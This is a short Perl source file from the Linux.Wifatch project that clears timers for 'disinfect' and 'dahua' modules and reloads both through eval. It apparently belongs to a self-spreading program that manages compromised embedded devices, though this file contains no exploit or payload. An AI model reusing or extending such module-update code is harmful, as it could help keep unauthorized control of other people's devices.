#
# This file is part of Linux.Wifatch
#
# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
#
# Linux.Wifatch is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Linux.Wifatch is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
#

# in the long run, we should have xx modules with automatic
# package loading via @INC

#bn::func::delete_package "bn::dahua";
#bn::func::delete_package "bn::disinfect";
undef $bn::disinfect::fs_timer;
undef $bn::disinfect::proc_timer;
undef $bn::disinfect::block_timer;
undef $bn::disinfect::spec_timer;
undef $bn::dahua::configure_timer;

for my $pkg (qw(dahua disinfect)) {
	bn::log "reloading xx6/$pkg";

	if (defined &{"xx6::$pkg\::UNLOAD"}) {
		&{"xx6::$pkg\::UNLOAD"}();
	}

	eval $bn::xx::PL[6]->("$pkg.pm");
	bn::log "xx6/$pkg: $@" if $@;

	if (defined &{"xx6::$pkg\::RELOAD"}) {
		&{"xx6::$pkg\::RELOAD"}();
	}
}

